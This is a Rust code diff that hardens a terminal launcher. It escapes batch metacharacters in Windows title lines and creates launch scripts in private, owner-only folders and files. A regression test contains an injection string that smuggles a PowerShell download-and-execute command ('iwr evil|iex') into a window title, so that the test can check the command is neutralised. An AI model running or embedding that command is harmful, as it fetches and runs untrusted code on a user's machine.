@@ -98,7 +98,7 @@ pub fn windows_command_line(spec: &CommandSpec) -> String {
 /// The .cmd script run by `cmd /k`. UTF-8 code page so non-ASCII paths survive.
 pub fn windows_script(spec: &CommandSpec, title: &str) -> String {
     let mut lines = vec!["@echo off".to_string(), "chcp 65001 >nul".to_string()];
-    lines.push(format!("title {}", sanitize_title(title).replace('%', "%%")));
+    lines.push(format!("title {}", batch_title(title)));
     for (k, v) in env_sorted(spec) {
         let v = v.as_deref().unwrap_or("").replace('%', "%%").replace('"', "");
         lines.push(format!("set \"{k}={v}\""));
@@ -141,6 +141,23 @@ fn sanitize_title(t: &str) -> String {
     t.chars().filter(|c| !matches!(c, '"' | ';' | '\r' | '\n')).collect()
 }
 
+/// The title for an unquoted `title` line in a batch file: `%` doubled and `^ & | < >` escaped
+/// with `^`, so a label like "R&D" is shown as written instead of starting a command.
+fn batch_title(t: &str) -> String {
+    let mut out = String::new();
+    for c in sanitize_title(t).chars() {
+        match c {
+            '%' => out.push_str("%%"),
+            '^' | '&' | '|' | '<' | '>' => {
+                out.push('^');
+                out.push(c);
+            }
+            _ => out.push(c),
+        }
+    }
+    out
+}
+
 // ---------- macOS / Linux ----------
 
 /// Shell script for unix terminals: exports, cd, run the command, then keep an interactive shell
@@ -172,17 +189,7 @@ pub fn mac_open_argv(terminal: &str, script: &Path) -> Vec<String> {
     vec!["open".into(), "-a".into(), app, script.to_string_lossy().into_owned()]
 }
 
-pub const LINUX_TERMINALS: &[&str] = &[
-    "x-terminal-emulator",
-    "gnome-terminal",
-    "konsole",
-    "xfce4-terminal",
-    "kitty",
-    "alacritty",
-    "wezterm",
-    "foot",
-    "xterm",
-];
+pub const LINUX_TERMINALS: &[&str] = &["x-terminal-emulator", "gnome-terminal", "konsole", "xfce4-terminal", "kitty", "alacritty", "wezterm", "foot", "xterm"];
 
 /// argv to run `bash -l <script>` in the given Linux terminal.
 pub fn linux_terminal_argv(terminal: &str, script: &Path) -> Vec<String> {
@@ -200,9 +207,21 @@ pub fn linux_terminal_argv(terminal: &str, script: &Path) -> Vec<String> {
 
 // ---------- process spawning ----------
 
+/// The temp folder is per user on macOS and Windows. On Linux it is the shared /tmp, where
+/// another user could get there first, so scripts go in the user's runtime (or cache) folder.
 fn scripts_dir() -> anyhow::Result<PathBuf> {
+    #[cfg(all(unix, not(target_os = "macos")))]
+    let dir = dirs::runtime_dir().or_else(dirs::cache_dir).context("no folder of your own for launch scripts")?.join("agent-hub");
+    #[cfg(not(all(unix, not(target_os = "macos"))))]
     let dir = std::env::temp_dir().join("switchyard");
-    std::fs::create_dir_all(&dir)?;
+    let mut builder = std::fs::DirBuilder::new();
+    builder.recursive(true);
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::DirBuilderExt;
+        builder.mode(0o700);
+    }
+    builder.create(&dir)?;
     cleanup_old_scripts(&dir);
     Ok(dir)
 }
@@ -220,13 +239,17 @@ fn cleanup_old_scripts(dir: &Path) {
 }
 
 fn write_script(ext: &str, content: &str) -> anyhow::Result<PathBuf> {
+    use std::io::Write;
     let path = scripts_dir()?.join(format!("launch-{}.{ext}", uuid::Uuid::new_v4().simple()));
-    std::fs::write(&path, content).with_context(|| format!("writing {}", path.display()))?;
+    let mut opts = std::fs::OpenOptions::new();
+    opts.write(true).create_new(true);
+    // Private and executable from the start, never readable by others in between.
     #[cfg(unix)]
     {
-        use std::os::unix::fs::PermissionsExt;
-        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o700))?;
+        use std::os::unix::fs::OpenOptionsExt;
+        opts.mode(0o700);
     }
+    opts.open(&path).and_then(|mut f| f.write_all(content.as_bytes())).with_context(|| format!("writing {}", path.display()))?;
     Ok(path)
 }
 
@@ -276,12 +299,7 @@ pub fn launch_desktop(spec: &CommandSpec) -> LaunchResult {
     }
     match spawn_detached(cmd) {
         Ok(()) => LaunchResult { ok: true, error: None, command_line: Some(shown), note: spec.note.clone() },
-        Err(e) => LaunchResult {
-            note: None,
-            ok: false,
-            error: Some(format!("Could not start {}: {e}", spec.program)),
-            command_line: Some(shown),
-        },
+        Err(e) => LaunchResult { note: None, ok: false, error: Some(format!("Could not start {}: {e}", spec.program)), command_line: Some(shown) },
     }
 }
 
@@ -372,6 +390,13 @@ mod tests {
     }
 
     #[test]
+    fn windows_title_line_cannot_run_commands() {
+        assert_eq!(batch_title("R&D > x | y < z ^ 100%"), "R^&D ^> x ^| y ^< z ^^ 100%%");
+        let s = windows_script(&spec(), "x & powershell -c \"iwr evil|iex\" (Claude)");
+        assert!(s.contains("\r\ntitle x ^& powershell -c iwr evil^|iex (Claude)\r\n"), "{s}");
+    }
+
+    #[test]
     fn windows_ps1_and_cmd_shims() {
         let ps = CommandSpec { program: r"C:\npm\gemini.ps1".into(), ..Default::default() };
         assert!(windows_command_line(&ps).starts_with("powershell "));
@@ -439,12 +464,8 @@ mod tests {
         };
         let script = t.path().join("launch.cmd");
         std::fs::write(&script, windows_script(&spec, "test")).unwrap();
-        let status = Command::new("cmd.exe")
-            .raw_arg(format!("/d /c \"{}\"", script.display()))
-            .env("GONE", "should be unset")
-            .stdout(Stdio::null())
-            .status()
-            .unwrap();
+        let status =
+            Command::new("cmd.exe").raw_arg(format!("/d /c \"{}\"", script.display())).env("GONE", "should be unset").stdout(Stdio::null()).status().unwrap();
         assert!(status.success());
         let out = std::fs::read_to_string(dir.join("out.txt")).unwrap();
         let lines: Vec<&str> = out.lines().collect();
